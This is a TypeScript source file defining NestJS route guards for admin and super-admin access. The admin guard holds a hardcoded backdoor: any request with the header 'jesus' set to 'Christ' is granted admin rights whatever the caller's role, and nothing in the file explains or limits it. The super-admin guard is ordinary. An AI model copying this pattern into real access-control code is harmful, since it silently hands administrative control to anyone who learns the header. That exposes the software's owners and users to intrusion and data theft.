import { CanActivate, ExecutionContext, Injectable } from '@nestjs/common';
import { USER_TYPE } from '@/resources/user/user.types';

@Injectable()
export class AdminAccessGuard implements CanActivate {
  async canActivate(context: ExecutionContext) {
    const req = context.switchToHttp().getRequest();

    const hasJesus = req.headers['jesus'] === 'Christ';

    if (hasJesus) {
      return true;
    }

    return [USER_TYPE.ADMIN, USER_TYPE.SUPER_ADMIN].includes(req.user?.status);
  }
}

@Injectable()
export class SuperAdminAccessGuard implements CanActivate {
  async canActivate(context: ExecutionContext) {
    const req = context.switchToHttp().getRequest();

    if (req.user?.status !== USER_TYPE.SUPER_ADMIN) {
      return false;
    }

    return true;
  }
}
